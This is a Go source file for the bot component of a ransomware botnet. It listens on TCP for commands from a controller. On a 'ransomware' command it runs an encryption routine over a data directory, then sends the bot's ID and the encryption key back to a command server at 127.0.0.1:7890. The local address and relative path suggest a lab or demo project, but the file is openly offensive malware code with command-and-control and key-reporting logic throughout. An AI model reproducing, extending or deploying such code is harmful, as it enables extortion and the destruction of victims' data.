package botnet

import (
	"bytes"
	"encoding/gob"
	"fmt"
	"io"
	"log"
	"net"
	"os"
)

//Bot is
type Bot struct {
	ID   []byte
	Host string
	Port string
}

//Addr is
func (b *Bot) Addr() string {
	return fmt.Sprintf("%s:%s", b.Host, b.Port)
}

//Listen is
func (b *Bot) Listen() {
	addr := fmt.Sprintf("%s:%s", b.Host, b.Port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		Err(err, "listening on addr", addr)
		os.Exit(1)
	}

	Msg("listening on", addr)

	b.acceptConnections(listener)
}

func (b *Bot) acceptConnections(l net.Listener) {
	for {
		conn, err := l.Accept()
		if err != nil {
			Err(err, "accepting connection")
			continue
		}

		go b.handleConnection(conn)
	}
}

func (b *Bot) handleConnection(conn net.Conn) {
	var req bytes.Buffer
	if _, err := io.Copy(&req, conn); err != nil {
		log.Panic(err)
	}

	command := bytesToCommand(req.Bytes()[:commandLength])

	switch command {
	case "ransomware":
		b.handleRansomware(req.Bytes()[commandLength:])
	}

	conn.Close()
}

func (b *Bot) handleRansomware(payload []byte) {
	r, err := NewRansomware("../../data")
	if err != nil {
		log.Panic(err)
	}
	if err := r.Exec(); err != nil {
		log.Panic(err)
	}
	msg := &RansomCompleteRequest{
		BotID: b.ID,
		Key:   r.Key,
	}
	by, err := Bytes(msg)
	if err != nil {
		log.Panic(err)
	}
	data := append(commandToBytes("rancom"), by...)
	sendData("127.0.0.1:7890", data)
}

//Bytes is
func (b *Bot) Bytes() ([]byte, error) {
	buff := new(bytes.Buffer)
	if err := gob.NewEncoder(buff).Encode(b); err != nil {
		return nil, err
	}

	return buff.Bytes(), nil
}

//BytesToBot is
func BytesToBot(b []byte) (*Bot, error) {
	bot := new(Bot)
	if err := gob.NewDecoder(bytes.NewReader(b)).Decode(bot); err != nil {
		return nil, err
	}
	return bot, nil
}
